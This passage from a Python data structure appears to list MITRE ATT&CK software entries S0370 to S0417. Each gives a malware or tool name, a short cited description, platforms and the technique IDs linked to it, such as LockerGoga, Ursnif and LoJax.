           'software_id': 'S0370',
           'type': 'malware'},
 'S0371': {'attack_ids': ['T1071', 'T1003', 'T1032', 'T1060', 'T1043', 'T1084', 'T1086'],
           'description': '[POWERTON](https://attack.mitre.org/software/S0371) is a custom PowerShell backdoor first '
                          'observed in 2018. It has typically been deployed as a late-stage backdoor by '
                          '[APT33](https://attack.mitre.org/groups/G0064). At least two variants of the backdoor have '
                          'been identified, with the later version containing improved functionality.(Citation: '
                          'FireEye APT33 Guardrail)',
           'name': 'POWERTON',
           'platforms': ['Windows'],
           'software_id': 'S0371',
           'type': 'malware'},
 'S0372': {'attack_ids': ['T1531', 'T1107', 'T1089', 'T1529', 'T1116', 'T1486', 'T1105'],
           'description': '[LockerGoga](https://attack.mitre.org/software/S0372) is ransomware that has been tied to '
                          'various attacks on European companies. It was first reported upon in January '
                          '2019.(Citation: Unit42 LockerGoga 2019)(Citation: CarbonBlack LockerGoga 2019)',
           'name': 'LockerGoga',
           'platforms': ['Windows'],
           'software_id': 'S0372',
           'type': 'malware'},
 'S0373': {'attack_ids': ['T1223',
                          'T1220',
                          'T1117',
                          'T1059',
                          'T1047',
                          'T1140',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1129',
                          'T1124',
                          'T1003',
                          'T1016',
                          'T1057',
                          'T1093',
                          'T1064',
                          'T1105',
                          'T1074',
                          'T1027',
                          'T1060',
                          'T1045',
                          'T1041',
                          'T1063',
                          'T1143',
                          'T1115',
                          'T1023'],
           'description': '[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer '
                          'known to affect companies in Europe and Brazil. It has been known publicly since at least '
                          'late 2017. (Citation: Cybereason Astaroth Feb 2019) (Citation: Cofense Astaroth Sept 2018)',
           'name': 'Astaroth',
           'platforms': ['Windows'],
           'software_id': 'S0373',
           'type': 'malware'},
 'S0374': {'attack_ids': ['T1110',
                          'T1071',
                          'T1203',
                          'T1016',
                          'T1027',
                          'T1107',
                          'T1082',
                          'T1132',
                          'T1064',
                          'T1046',
                          'T1168',
                          'T1049',
                          'T1105',
                          'T1033'],
           'description': '[SpeakUp](https://attack.mitre.org/software/S0374) is a Trojan backdoor that targets both '
                          'Linux and OSX devices. It was first observed in January 2019. (Citation: CheckPoint SpeakUp '
                          'Feb 2019)',
           'name': 'SpeakUp',
           'platforms': ['Linux', 'macOS'],
           'software_id': 'S0374',
           'type': 'malware'},
 'S0375': {'attack_ids': ['T1047',
                          'T1140',
                          'T1071',
                          'T1010',
                          'T1004',
                          'T1027',
                          'T1056',
                          'T1053',
                          'T1113',
                          'T1060',
                          'T1064',
                          'T1022',
                          'T1041',
                          'T1083',
                          'T1115',
                          'T1059'],
           'description': '[Remexi](https://attack.mitre.org/software/S0375) is a Windows-based Trojan that was '
                          'developed in the C programming language.(Citation: Securelist Remexi Jan 2019)',
           'name': 'Remexi',
           'platforms': ['Windows'],
           'software_id': 'S0375',
           'type': 'malware'},
 'S0376': {'attack_ids': ['T1055',
                          'T1059',
                          'T1047',
                          'T1090',
                          'T1082',
                          'T1065',
                          'T1012',
                          'T1124',
                          'T1003',
                          'T1001',
                          'T1083',
                          'T1035',
                          'T1105',
                          'T1112',
                          'T1008',
                          'T1043',
                          'T1089',
                          'T1041',
                          'T1075'],
           'description': '[HOPLIGHT](https://attack.mitre.org/software/S0376) is a backdoor Trojan that has '
                          'reportedly been used by the North Korean government.(Citation: US-CERT HOPLIGHT Apr 2019)',
           'name': 'HOPLIGHT',
           'platforms': ['Windows'],
           'software_id': 'S0376',
           'type': 'malware'},
 'S0377': {'attack_ids': ['T1184', 'T1071', 'T1024', 'T1027', 'T1483', 'T1145', 'T1132', 'T1043', 'T1089', 'T1116'],
           'description': '[Ebury](https://attack.mitre.org/software/S0377) is an SSH backdoor targeting Linux '
                          'operating systems. Attackers require root-level access, which allows them to replace SSH '
                          'binaries (ssh, sshd, ssh-add, etc) or modify a shared library used by OpenSSH '
                          '(libkeyutils).(Citation: ESET Ebury Feb 2014)(Citation: BleepingComputer Ebury March 2017)',
           'name': 'Ebury',
           'platforms': ['Linux'],
           'software_id': 'S0377',
           'type': 'malware'},
 'S0378': {'attack_ids': ['T1055',
                          'T1087',
                          'T1482',
                          'T1007',
                          'T1002',
                          'T1047',
                          'T1110',
                          'T1201',
                          'T1040',
                          'T1068',
                          'T1056',
                          'T1082',
                          'T1171',
                          'T1090',
                          'T1084',
                          'T1119',
                          'T1003',
                          'T1016',
                          'T1134',
                          'T1069',
                          'T1046',
                          'T1088',
                          'T1210',
                          'T1083',
                          'T1035',
                          'T1071',
                          'T1081',
                          'T1049',
                          'T1075'],
           'description': '[PoshC2](https://attack.mitre.org/software/S0378) is an open source remote administration '
                          'and post-exploitation framework that is publicly available on GitHub. The server-side '
                          'components of the tool are primarily written in Python, while the implants are written in '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086). Although '
                          '[PoshC2](https://attack.mitre.org/software/S0378) is primarily focused on Windows '
                          'implantation, it does contain a basic Python dropper for Linux/macOS.(Citation: GitHub '
                          'PoshC2)',
           'name': 'PoshC2',
           'platforms': ['Windows', 'Linux', 'macOS'],
           'software_id': 'S0378',
           'type': 'tool'},
 'S0379': {'attack_ids': ['T1053',
                          'T1059',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1102',
                          'T1086',
                          'T1170',
                          'T1065',
                          'T1003',
                          'T1125',
                          'T1016',
                          'T1064',
                          'T1123',
                          'T1105',
                          'T1076',
                          'T1113',
                          'T1060',
                          'T1033',
                          'T1202'],
           'description': '[Revenge RAT](https://attack.mitre.org/software/S0379) is a freely available remote access '
                          'tool written in .NET (C#).(Citation: Cylance Shaheen Nov 2018)(Citation: Cofense RevengeRAT '
                          'Feb 2019)',
           'name': 'Revenge RAT',
           'platforms': ['Windows'],
           'software_id': 'S0379',
           'type': 'malware'},
 'S0380': {'attack_ids': ['T1047',
                          'T1124',
                          'T1027',
                          'T1107',
                          'T1055',
                          'T1485',
                          'T1082',
                          'T1113',
                          'T1488',
                          'T1064',
                          'T1012',
                          'T1063',
                          'T1487',
                          'T1105',
                          'T1497'],
           'description': '[StoneDrill](https://attack.mitre.org/software/S0380) is wiper malware discovered in '
                          'destructive campaigns against both Middle Eastern and European targets in association with '
                          '[APT33](https://attack.mitre.org/groups/G0064).(Citation: FireEye APT33 Sept '
                          '2017)(Citation: Kaspersky StoneDrill 2017)',
           'name': 'StoneDrill',
           'platforms': ['Windows'],
           'software_id': 'S0380',
           'type': 'malware'},
 'S0381': {'attack_ids': ['T1047', 'T1071', 'T1032', 'T1082', 'T1069', 'T1043', 'T1001', 'T1063', 'T1033', 'T1120'],
           'description': '[FlawedAmmyy](https://attack.mitre.org/software/S0381) is a remote access tool (RAT) that '
                          'was first seen in early 2016. The code for '
                          '[FlawedAmmyy](https://attack.mitre.org/software/S0381) was based on leaked source code for '
                          'a version of Ammyy Admin, a remote access software.(Citation: Proofpoint TA505 Mar 2018)',
           'name': 'FlawedAmmyy',
           'platforms': ['Windows'],
           'software_id': 'S0381',
           'type': 'malware'},
 'S0382': {'attack_ids': ['T1071',
                          'T1136',
                          'T1107',
                          'T1076',
                          'T1085',
                          'T1032',
                          'T1053',
                          'T1082',
                          'T1060',
                          'T1043',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[ServHelper](https://attack.mitre.org/software/S0382) is a backdoor first observed in late '
                          '2018. The backdoor is written in Delphi and is typically delivered as a DLL file.(Citation: '
                          'Proofpoint TA505 Jan 2019)',
           'name': 'ServHelper',
           'platforms': ['Windows'],
           'software_id': 'S0382',
           'type': 'malware'},
 'S0383': {'attack_ids': ['T1094', 'T1027', 'T1043'],
           'description': '[FlawedGrace](https://attack.mitre.org/software/S0383) is a fully featured remote access '
                          'tool (RAT) written in C++ that was first observed in late 2017.(Citation: Proofpoint TA505 '
                          'Jan 2019)',
           'name': 'FlawedGrace',
           'platforms': ['Windows'],
           'software_id': 'S0383',
           'type': 'malware'},
 'S0384': {'attack_ids': ['T1071', 'T1032', 'T1090', 'T1219', 'T1185'],
           'description': '[Dridex](https://attack.mitre.org/software/S0384) is a banking Trojan that has been used '
                          'for financial gain. Dridex was created from the source code of the Bugat banking trojan '
                          '(also known as Cridex).(Citation: Dell Dridex Oct 2015)(Citation: Kaspersky Dridex May '
                          '2017)',
           'name': 'Dridex',
           'platforms': ['Windows'],
           'software_id': 'S0384',
           'type': 'malware'},
 'S0385': {'attack_ids': ['T1094',
                          'T1091',
                          'T1059',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1503',
                          'T1005',
                          'T1065',
                          'T1018',
                          'T1125',
                          'T1107',
                          'T1083',
                          'T1105',
                          'T1010',
                          'T1076',
                          'T1112',
                          'T1060',
                          'T1113',
                          'T1089',
                          'T1033',
                          'T1120'],
           'description': '[njRAT](https://attack.mitre.org/software/S0385) is a remote access tool (RAT) that was '
                          'first observed in 2012. It has been used by threat actors in the Middle East.(Citation: '
                          'Fidelis njRAT June 2013)',
           'name': 'njRAT',
           'platforms': ['Windows'],
           'software_id': 'S0385',
           'type': 'malware'},
 'S0386': {'attack_ids': ['T1094',
                          'T1055',
                          'T1175',
                          'T1091',
                          'T1007',
                          'T1106',
                          'T1080',
                          'T1140',
                          'T1047',
                          'T1082',
                          'T1132',
                          'T1090',
                          'T1005',
                          'T1036',
                          'T1086',
                          'T1012',
                          'T1050',
                          'T1107',
                          'T1057',
                          'T1093',
                          'T1064',
                          'T1497',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1112',
                          'T1027',
                          'T1483',
                          'T1060',
                          'T1113',
                          'T1188',
                          'T1179',
                          'T1185',
                          'T1143'],
           'description': '[Ursnif](https://attack.mitre.org/software/S0386) is a banking trojan and variant of the '
                          'Gozi malware observed being spread through various automated exploit kits, [Spearphishing '
                          'Attachment](https://attack.mitre.org/techniques/T1193)s, and malicious links.(Citation: '
                          'NJCCIC Ursnif Sept 2016)(Citation: ProofPoint Ursnif Aug 2016) '
                          '[Ursnif](https://attack.mitre.org/software/S0386) is associated primarily with data theft, '
                          'but variants also include components (backdoors, spyware, file injectors, etc.) capable of '
                          'a wide variety of behaviors.(Citation: TrendMicro Ursnif Mar 2015)',
           'name': 'Ursnif',
           'platforms': ['Windows'],
           'software_id': 'S0386',
           'type': 'malware'},
 'S0387': {'attack_ids': ['T1024',
                          'T1059',
                          'T1203',
                          'T1056',
                          'T1082',
                          'T1503',
                          'T1086',
                          'T1099',
                          'T1050',
                          'T1016',
                          'T1064',
                          'T1083',
                          'T1105',
                          'T1004',
                          'T1027',
                          'T1113',
                          'T1043',
                          'T1173',
                          'T1143'],
           'description': '[KeyBoy](https://attack.mitre.org/software/S0387) is malware that has been used in targeted '
                          'campaigns against members of the Tibetan Parliament in 2016.(Citation: CitizenLab KeyBoy '
                          'Nov 2016)(Citation: PWC KeyBoys Feb 2017)',
           'name': 'KeyBoy',
           'platforms': ['Windows'],
           'software_id': 'S0387',
           'type': 'malware'},
 'S0388': {'attack_ids': ['T1140', 'T1071', 'T1027', 'T1082', 'T1063', 'T1105'],
           'description': 'Yahoyah is a Trojan used by [Tropic Trooper](https://attack.mitre.org/groups/G0081) as a '
                          'second-stage backdoor.(Citation: TrendMicro TropicTrooper 2015)',
           'name': 'Yahoyah',
           'platforms': ['Windows'],
           'software_id': 'S0388',
           'type': 'malware'},
 'S0389': {'attack_ids': ['T1086', 'T1060', 'T1490', 'T1064', 'T1486', 'T1204', 'T1059'],
           'description': '[JCry](https://attack.mitre.org/software/S0389) is ransomware written in Go. It was '
                          'identified as apart of the #OpJerusalem 2019 campaign.(Citation: Carbon Black JCry May '
                          '2019)',
           'name': 'JCry',
           'platforms': [],
           'software_id': 'S0389',
           'type': 'malware'},
 'S0390': {'attack_ids': ['T1140', 'T1027', 'T1107', 'T1053', 'T1064', 'T1086', 'T1204', 'T1105'],
           'description': '[SQLRat](https://attack.mitre.org/software/S0390) is malware that executes SQL scripts to '
                          'avoid leaving traditional host artifacts. [FIN7](https://attack.mitre.org/groups/G0046) has '
                          'been observed using it.(Citation: Flashpoint FIN 7 March 2019)',
           'name': 'SQLRat',
           'platforms': [],
           'software_id': 'S0390',
           'type': 'malware'},
 'S0391': {'attack_ids': ['T1071',
                          'T1203',
                          'T1107',
                          'T1027',
                          'T1082',
                          'T1043',
                          'T1022',
                          'T1106',
                          'T1041',
                          'T1173',
                          'T1033',
                          'T1497',
                          'T1105',
                          'T1059'],
           'description': '[HAWKBALL](https://attack.mitre.org/software/S0391) is a backdoor that was observed in '
                          'targeting of the government sector in Central Asia.(Citation: FireEye HAWKBALL Jun 2019)',
           'name': 'HAWKBALL',
           'platforms': ['Windows'],
           'software_id': 'S0391',
           'type': 'malware'},
 'S0393': {'attack_ids': ['T1027', 'T1057', 'T1064', 'T1102', 'T1086', 'T1099'],
           'description': '[PowerStallion](https://attack.mitre.org/software/S0393) is a lightweight '
                          '[PowerShell](https://attack.mitre.org/techniques/T1086) backdoor used by '
                          '[Turla](https://attack.mitre.org/groups/G0010), possibly as a recovery access tool to '
                          'install other backdoors.(Citation: ESET Turla PowerShell May 2019)',
           'name': 'PowerStallion',
           'platforms': ['Windows'],
           'software_id': 'S0393',
           'type': 'malware'},
 'S0394': {'attack_ids': ['T1095',
                          'T1140',
                          'T1156',
                          'T1136',
                          'T1014',
                          'T1027',
                          'T1055',
                          'T1024',
                          'T1064',
                          'T1065',
                          'T1105'],
           'description': '[HiddenWasp](https://attack.mitre.org/software/S0394) is a Linux-based Trojan used to '
                          'target systems for remote control. It comes in the form of a statistically linked ELF '
                          'binary with stdlibc++.(Citation: Intezer HiddenWasp Map 2019)',
           'name': 'HiddenWasp',
           'platforms': ['Linux'],
           'software_id': 'S0394',
           'type': 'malware'},
 'S0395': {'attack_ids': ['T1032',
                          'T1106',
                          'T1029',
                          'T1059',
                          'T1140',
                          'T1082',
                          'T1005',
                          'T1036',
                          'T1022',
                          'T1119',
                          'T1107',
                          'T1020',
                          'T1016',
                          'T1493',
                          'T1114',
                          'T1001',
                          'T1105',
                          'T1071',
                          'T1074',
                          'T1027',
                          'T1041',
                          'T1505'],
           'description': '[LightNeuron](https://attack.mitre.org/software/S0395) is a sophisticated backdoor that has '
                          'targeted Microsoft Exchange servers since at least 2014. '
                          '[LightNeuron](https://attack.mitre.org/software/S0395) has been used by '
                          '[Turla](https://attack.mitre.org/groups/G0010) to target diplomatic and foreign '
                          'affairs-related organizations. The presence of certain strings in the malware suggests a '
                          'Linux variant of [LightNeuron](https://attack.mitre.org/software/S0395) exists.(Citation: '
                          'ESET LightNeuron May 2019)',
           'name': 'LightNeuron',
           'platforms': ['Windows', 'Linux'],
           'software_id': 'S0395',
           'type': 'malware'},
 'S0396': {'attack_ids': ['T1047',
                          'T1071',
                          'T1124',
                          'T1203',
                          'T1107',
                          'T1053',
                          'T1060',
                          'T1057',
                          'T1064',
                          'T1063',
                          'T1497',
                          'T1105'],
           'description': '[EvilBunny](https://attack.mitre.org/software/S0396) is a C++ malware sample observed since '
                          '2011 that was designed to be a execution platform for Lua scripts.(Citation: Cyphort '
                          'EvilBunny Dec 2014)',
           'name': 'EvilBunny',
           'platforms': ['Windows'],
           'software_id': 'S0396',
           'type': 'malware'},
 'S0397': {'attack_ids': ['T1014', 'T1112', 'T1096', 'T1060', 'T1019'],
           'description': '[LoJax](https://attack.mitre.org/software/S0397) is a UEFI rootkit used by '
                          '[APT28](https://attack.mitre.org/groups/G0007) to persist remote access software on '
                          'targeted systems.(Citation: ESET LoJax Sept 2018)',
           'name': 'LoJax',
           'platforms': ['Windows'],
           'software_id': 'S0397',
           'type': 'malware'},
 'S0398': {'attack_ids': ['T1071', 'T1107', 'T1055', 'T1007', 'T1073', 'T1113', 'T1106', 'T1035', 'T1105'],
           'description': '[HyperBro](https://attack.mitre.org/software/S0398) is a custom in-memory backdoor used by '
                          '[Threat Group-3390](https://attack.mitre.org/groups/G0027).(Citation: Unit42 Emissary Panda '
                          'May 2019)(Citation: Securelist LuckyMouse June 2018)(Citation: Hacker News LuckyMouse June '
                          '2018)',
           'name': 'HyperBro',
           'platforms': ['Windows'],
           'software_id': 'S0398',
           'type': 'malware'},
 'S0399': {'attack_ids': ['T1433',
                          'T1447',
                          'T1411',
                          'T1512',
                          'T1412',
                          'T1432',
                          'T1406',
                          'T1426',
                          'T1507',
                          'T1429',
                          'T1437',
                          'T1409',
                          'T1418',
                          'T1430',
                          'T1476'],
           'description': '[Pallas](https://attack.mitre.org/software/S0399) is mobile surveillanceware that was '
                          'custom-developed by [Dark Caracal](https://attack.mitre.org/groups/G0070).(Citation: '
                          'Lookout Dark Caracal Jan 2018)',
           'name': 'Pallas',
           'platforms': ['Android'],
           'software_id': 'S0399',
           'type': 'malware'},
 'S0400': {'attack_ids': ['T1126', 'T1490', 'T1089', 'T1486', 'T1489', 'T1059'],
           'description': '[RobbinHood](https://attack.mitre.org/software/S0400) is ransomware that was first observed '
                          "being used in an attack against the Baltimore city government's computer network.(Citation: "
                          'CarbonBlack RobbinHood May 2019)(Citation: BaltimoreSun RobbinHood May 2019)',
           'name': 'RobbinHood',
           'platforms': ['Windows'],
           'software_id': 'S0400',
           'type': 'malware'},
 'S0401': {'attack_ids': ['T1071', 'T1501', 'T1027', 'T1168', 'T1105', 'T1059'],
           'description': '[Exaramel for Linux](https://attack.mitre.org/software/S0401) is a backdoor written in the '
                          'Go Programming Language and compiled as a 64-bit ELF binary. The Windows version is tracked '
                          'separately under [Exaramel for Windows](https://attack.mitre.org/software/S0343).(Citation: '
                          'ESET TeleBots Oct 2018)',
           'name': 'Exaramel for Linux',
           'platforms': ['Linux'],
           'software_id': 'S0401',
           'type': 'malware'},
 'S0402': {'attack_ids': ['T1140', 'T1222', 'T1082', 'T1176', 'T1036', 'T1064', 'T1089', 'T1514', 'T1204', 'T1158'],
           'description': '[OSX/Shlayer](https://attack.mitre.org/software/S0402) is a Trojan designed to install '
                          'adware on macOS. It was first discovered in 2018.(Citation: Carbon Black Shlayer Feb '
                          '2019)(Citation: Intego Shlayer Feb 2018)',
           'name': 'OSX/Shlayer',
           'platforms': ['macOS'],
           'software_id': 'S0402',
           'type': 'malware'},
 'S0403': {'attack_ids': ['T1516', 'T1422', 'T1412', 'T1432', 'T1426', 'T1437', 'T1418', 'T1411', 'T1476'],
           'description': '[Riltok](https://attack.mitre.org/software/S0403) is banking malware that uses phishing '
                          'popups to collect user credentials.(Citation: Kaspersky Riltok June 2019)',
           'name': 'Riltok',
           'platforms': ['Android'],
           'software_id': 'S0403',
           'type': 'malware'},
 'S0404': {'attack_ids': ['T1105', 'T1003', 'T1096'],
           'description': '[esentutl](https://attack.mitre.org/software/S0404) is a command-line tool that provides '
                          'database utilities for the Windows Extensible Storage Engine.(Citation: Microsoft Esentutl)',
           'name': 'esentutl',
           'platforms': ['Windows'],
           'software_id': 'S0404',
           'type': 'tool'},
 'S0405': {'attack_ids': ['T1412',
                          'T1432',
                          'T1475',
                          'T1533',
                          'T1532',
                          'T1507',
                          'T1407',
                          'T1509',
                          'T1433',
                          'T1512',
                          'T1513',
                          'T1437',
                          'T1418',
                          'T1430',
                          'T1422',
                          'T1435',
                          'T1404',
                          'T1429',
                          'T1409'],
           'description': '[Exodus](https://attack.mitre.org/software/S0405) is Android spyware deployed in two '
                          'distinct stages named Exodus One (dropper) and Exodus Two (payload).(Citation: SWB Exodus '
                          'March 2019)',
           'name': 'Exodus',
           'platforms': ['Android'],
           'software_id': 'S0405',
           'type': 'malware'},
 'S0406': {'attack_ids': ['T1417',
                          'T1438',
                          'T1516',
                          'T1422',
                          'T1412',
                          'T1406',
                          'T1432',
                          'T1426',
                          'T1508',
                          'T1533',
                          'T1437',
                          'T1418',
                          'T1411',
                          'T1476'],
           'description': '[Gustuff](https://attack.mitre.org/software/S0406) is mobile malware designed to steal '
                          "users' banking and virtual currency credentials.(Citation: Talos Gustuff Apr 2019)",
           'name': 'Gustuff',
           'platforms': ['Android'],
           'software_id': 'S0406',
           'type': 'malware'},
 'S0407': {'attack_ids': ['T1446',
                          'T1432',
                          'T1533',
                          'T1447',
                          'T1426',
                          'T1507',
                          'T1433',
                          'T1438',
                          'T1512',
                          'T1406',
                          'T1513',
                          'T1418',
                          'T1430',
                          'T1417',
                          'T1410',
                          'T1400',
                          'T1422',
                          'T1435',
                          'T1429'],
           'description': '[Monokle](https://attack.mitre.org/software/S0407) is targeted, sophisticated mobile '
                          'surveillanceware. It is developed for Android, but there are some code artifacts that '
                          'suggests an iOS version may be in development.(Citation: Lookout-Monokle)',
           'name': 'Monokle',
           'platforms': ['Android'],
           'software_id': 'S0407',
           'type': 'malware'},
 'S0408': {'attack_ids': ['T1447',
                          'T1417',
                          'T1400',
                          'T1406',
                          'T1432',
                          'T1512',
                          'T1412',
                          'T1402',
                          'T1435',
                          'T1513',
                          'T1508',
                          'T1507',
                          'T1509',
                          'T1533',
                          'T1429',
                          'T1409',
                          'T1418',
                          'T1430'],
           'description': '[FlexiSpy](https://attack.mitre.org/software/S0408) is sophisticated surveillanceware for '
                          'iOS and Android. Publicly-available, comprehensive analysis has only been found for the '
                          'Android version.(Citation: FortiGuard-FlexiSpy)(Citation: CyberMerchants-FlexiSpy)\n'
                          '\n'
                          '[FlexiSpy](https://attack.mitre.org/software/S0408) markets itself as a parental control '
                          'and employee monitoring application.(Citation: FlexiSpy-Website)',
           'name': 'FlexiSpy',
           'platforms': ['Android'],
           'software_id': 'S0408',
           'type': 'tool'},
 'S0409': {'attack_ids': ['T1217',
                          'T1053',
                          'T1029',
                          'T1002',
                          'T1140',
                          'T1056',
                          'T1082',
                          'T1503',
                          'T1005',
                          'T1036',
                          'T1022',
                          'T1158',
                          'T1020',
                          'T1107',
                          'T1125',
                          'T1016',
                          'T1057',
                          'T1064',
                          'T1123',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1010',
                          'T1027',
                          'T1074',
                          'T1145',
                          'T1008',
                          'T1025',
                          'T1113',
                          'T1081',
                          'T1045',
                          'T1052',
                          'T1041',
                          'T1049',
                          'T1120',
                          'T1115'],
           'description': '[Machete](https://attack.mitre.org/software/S0409) is a cyber espionage toolset developed '
                          'by a Spanish-speaking group known as El [Machete](https://attack.mitre.org/groups/G0095). '
                          'It is a Python-based backdoor targeting Windows machines, and it was first observed in '
                          '2010.(Citation: ESET Machete July 2019)(Citation: Securelist Machete Aug 2014)',
           'name': 'Machete',
           'platforms': ['Windows'],
           'software_id': 'S0409',
           'type': 'malware'},
 'S0410': {'attack_ids': ['T1501',
                          'T1027',
                          'T1107',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1057',
                          'T1036',
                          'T1043',
                          'T1083',
                          'T1059'],
           'description': '[Fysbis](https://attack.mitre.org/software/S0410) is a Linux-based backdoor used by '
                          '[APT28](https://attack.mitre.org/groups/G0007) that dates back to at least 2014.(Citation: '
                          'Fysbis Palo Alto Analysis)',
           'name': 'Fysbis',
           'platforms': ['Linux'],
           'software_id': 'S0410',
           'type': 'malware'},
 'S0411': {'attack_ids': ['T1521',
                          'T1438',
                          'T1446',
                          'T1422',
                          'T1406',
                          'T1432',
                          'T1412',
                          'T1424',
                          'T1426',
                          'T1508',
                          'T1523',
                          'T1437',
                          'T1520',
                          'T1418',
                          'T1411',
                          'T1476'],
           'description': '[Rotexy](https://attack.mitre.org/software/S0411) is an Android banking malware that has '
                          'evolved over several years. It was originally an SMS spyware Trojan first spotted in '
                          'October 2014, and since then has evolved to contain more features, including ransomware '
                          'functionality.(Citation: securelist rotexy 2018)',
           'name': 'Rotexy',
           'platforms': ['Android'],
           'software_id': 'S0411',
           'type': 'malware'},
 'S0412': {'attack_ids': ['T1055',
                          'T1007',
                          'T1059',
                          'T1085',
                          'T1056',
                          'T1082',
                          'T1090',
                          'T1021',
                          'T1070',
                          'T1065',
                          'T1012',
                          'T1050',
                          'T1134',
                          'T1125',
                          'T1107',
                          'T1057',
                          'T1046',
                          'T1083',
                          'T1105',
                          'T1071',
                          'T1136',
                          'T1076',
                          'T1499',
                          'T1113',
                          'T1043',
                          'T1089',
                          'T1179',
                          'T1033'],
           'description': '[ZxShell](https://attack.mitre.org/software/S0412) is a remote administration tool and '
                          'backdoor that can be downloaded from the Internet, particularly from Chinese hacker '
                          'websites. It has been used since at least 2004.(Citation: FireEye APT41 Aug 2019)(Citation: '
                          'Talos ZxShell Oct 2014 )',
           'name': 'ZxShell',
           'platforms': ['Windows'],
           'software_id': 'S0412',
           'type': 'malware'},
 'S0413': {'attack_ids': ['T1110', 'T1114', 'T1087'],
           'description': 'MailSniper is a penetration testing tool for searching through email in a Microsoft '
                          'Exchange environment for specific terms (passwords, insider intel, network architecture '
                          'information, etc.). It can be used by a non-administrative user to search their own email, '
                          'or by an Exchange administrator to search the mailboxes of every user in a '
                          'domain.(Citation: GitHub MailSniper)',
           'name': 'MailSniper',
           'platforms': ['Office 365', 'Windows', 'Azure AD'],
           'software_id': 'S0413',
           'type': 'tool'},
 'S0414': {'attack_ids': ['T1107',
                          'T1016',
                          'T1056',
                          'T1082',
                          'T1132',
                          'T1060',
                          'T1057',
                          'T1083',
                          'T1012',
                          'T1033',
                          'T1105',
                          'T1059'],
           'description': '[BabyShark](https://attack.mitre.org/software/S0414) is a Microsoft Visual Basic (VB) '
                          'script-based malware family that is believed to be associated with several North Korean '
                          'campaigns. (Citation: Unit42 BabyShark Feb 2019)',
           'name': 'BabyShark',
           'platforms': ['Windows'],
           'software_id': 'S0414',
           'type': 'malware'},
 'S0415': {'attack_ids': ['T1140', 'T1027', 'T1038', 'T1129', 'T1116'],
           'description': '[BOOSTWRITE](https://attack.mitre.org/software/S0415) is a loader crafted to be launched '
                          'via abuse of the DLL search order of applications used by '
                          '[FIN7](https://attack.mitre.org/groups/G0046).(Citation: FireEye FIN7 Oct 2019)',
           'name': 'BOOSTWRITE',
           'platforms': ['Windows'],
           'software_id': 'S0415',
           'type': 'malware'},
 'S0416': {'attack_ids': ['T1179', 'T1106', 'T1107'],
           'description': '[RDFSNIFFER](https://attack.mitre.org/software/S0416) is a module loaded by '
                          '[BOOSTWRITE](https://attack.mitre.org/software/S0415) which allows an attacker to monitor '
                          'and tamper with legitimate connections made via an application designed to provide '
                          'visibility and system management capabilities to remote IT techs.(Citation: FireEye FIN7 '
                          'Oct 2019)',
           'name': 'RDFSNIFFER',
           'platforms': ['Windows'],
           'software_id': 'S0416',
           'type': 'malware'},
 'S0417': {'attack_ids': ['T1124', 'T1082', 'T1053', 'T1069', 'T1060', 'T1113', 'T1086'],
           'description': '[GRIFFON](https://attack.mitre.org/software/S0417) is a JavaScript backdoor used by '
                          '[FIN7](https://attack.mitre.org/groups/G0046). (Citation: SecureList Griffon May 2019)',
           'name': 'GRIFFON',
           'platforms': ['Windows'],
           'software_id': 'S0417',
           'type': 'malware'}
}
